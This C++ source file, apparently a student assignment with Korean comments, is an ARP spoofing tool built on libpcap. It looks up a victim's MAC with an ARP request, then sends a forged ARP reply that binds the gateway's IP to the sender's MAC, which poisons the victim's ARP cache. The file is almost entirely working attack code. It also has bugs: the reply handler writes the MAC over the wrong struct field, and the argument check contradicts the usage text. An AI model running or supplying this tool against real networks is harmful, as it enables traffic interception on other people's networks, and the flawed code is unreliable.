#include <cstdio>
#include <pcap.h>
#include <stdlib.h>
#include <ifaddrs.h>
#include <linux/if_packet.h>
#include "header/ethhdr.h"
#include "header/arphdr.h"

#pragma pack(push, 1)
struct EthArpPacket final {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)

void usage() {
	printf("syntax: send-arp-test <interface>\n");
	printf("sample: send-arp-test wlan0\n");
}

typedef struct HandlerData {
    pcap_t* handle;       // pcap 핸들
    char sender_mac[18];  // MAC 주소를 저장할 버퍼
};

typedef struct {
    char* macAddress;
    char* ipAddress;
} NetworkAddresses;

void arp_reply_handler(u_char *user_data, const struct pcap_pkthdr *pkthdr, const u_char *packet) {
	HandlerData* data = (HandlerData*)user_data;

	PEthHdr eth_hdr = (PEthHdr)packet;
    
    // Ethernet 헤더의 type 필드를 확인하여 ARP 패킷인지 검사
    if (eth_hdr->type() != EthHdr::Arp) return;

	PArpHdr arp_hdr = (PArpHdr)(packet + sizeof(EthHdr)); // ARP 헤더 찾기
    
	if (arp_hdr->op() != ArpHdr::Reply) return; // ARP 응답이 아니면 반환

	// IP를 확인?
	
	std::string smacString = std::string(eth_hdr->smac());
    std::strncpy((char*)user_data, smacString.c_str(), smacString.size() + 1); // +1 for null terminator
	pcap_breakloop(data->handle);
}

NetworkAddresses* getUserAddresses(const char* interface) {
    struct ifaddrs *ifaddr, *ifa;
    int family, s;
    char host[NI_MAXHOST];
    NetworkAddresses* addresses = (NetworkAddresses*)malloc(sizeof(NetworkAddresses));

    if (getifaddrs(&ifaddr) == -1) {
        perror("getifaddrs");
        exit(EXIT_FAILURE);
    }

    for (ifa = ifaddr; ifa != NULL; ifa = ifa->ifa_next) {
        if (ifa->ifa_addr == NULL)
            continue;  

        s=getnameinfo(ifa->ifa_addr,sizeof(struct sockaddr_in),host, NI_MAXHOST, NULL, 0, NI_NUMERICHOST);

        if((strcmp(ifa->ifa_name,interface)==0)&&(ifa->ifa_addr->sa_family==AF_INET)) {
            if (s != 0) {
                printf("getnameinfo() failed: %s\n", gai_strerror(s));
                exit(EXIT_FAILURE);
            }
            addresses->ipAddress = strdup(host);
        }

        if ((strcmp(ifa->ifa_name, interface) == 0)&&(ifa->ifa_addr->sa_family == AF_PACKET)) {
            struct sockaddr_ll *s = (struct sockaddr_ll*)ifa->ifa_addr;
            asprintf(&addresses->macAddress, "%02x:%02x:%02x:%02x:%02x:%02x",
                     (int)s->sll_addr[0], (int)s->sll_addr[1], (int)s->sll_addr[2], 
                     (int)s->sll_addr[3], (int)s->sll_addr[4], (int)s->sll_addr[5]);
        }
    }

    freeifaddrs(ifaddr);
    return addresses;
}

int main(int argc, char* argv[]) {
	if (argc % 2  != 0) {
		usage();
		return -1;
	}

	int i = 1;

	char* dev = argv[1];
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
	}

	// find my mac address and ip
	NetworkAddresses* addresses = getUserAddresses(dev);
		
	if(addresses->macAddress == nullptr){
		fprintf(stderr, "couldn't find your mac address\n");
		return -1;
	}

	if(addresses->ipAddress == nullptr){
		fprintf(stderr, "couldn't find your IP address\n");
		return -1;
	}

	while(i < argc - 1){
		char* sender_ip = argv[i + 1]; // victim
		char* target_ip = argv[i + 2]; // gateway

		EthArpPacket packet;

		// get sender's mac address
		packet.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff");
		packet.eth_.smac_ = Mac(addresses->macAddress);
		packet.eth_.type_ = htons(EthHdr::Arp);

		packet.arp_.hrd_ = htons(ArpHdr::ETHER);
		packet.arp_.pro_ = htons(EthHdr::Ip4);
		packet.arp_.hln_ = Mac::SIZE;
		packet.arp_.pln_ = Ip::SIZE;
		packet.arp_.op_ = htons(ArpHdr::Request);
		packet.arp_.smac_ = Mac(addresses->macAddress);
		packet.arp_.sip_ = htonl(Ip(addresses->ipAddress));
		packet.arp_.tmac_ = Mac("00:00:00:00:00:00");
		packet.arp_.tip_ = htonl(Ip(sender_ip));

		int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
		if (res != 0) {
			fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
			return -1;
		}

		HandlerData data;
    	data.handle = handle; // pcap_t* 핸들을 구조체에 저장
    	memset(data.sender_mac, 0, sizeof(data.sender_mac)); // MAC 주소 버퍼 초기화

    	pcap_loop(handle, -1, arp_reply_handler, (u_char*)&data);

		// ARP table 변조
		packet.eth_.dmac_ = Mac(data.sender_mac);
		packet.eth_.smac_ = Mac(addresses->macAddress);
		packet.arp_.op_ = htons(ArpHdr::Reply);
		packet.arp_.smac_ = Mac(addresses->macAddress);
		packet.arp_.sip_ = htonl(Ip(target_ip));
		packet.arp_.tmac_ = Mac(data.sender_mac);
		packet.arp_.tip_ = htonl(Ip(sender_ip));

		res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
		if (res != 0) {
			fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
			return -1;
		}

		i += 2;
	}

	pcap_close(handle);
	free(addresses->macAddress);
	free(addresses->ipAddress);
	free(addresses);

	return 0;
}
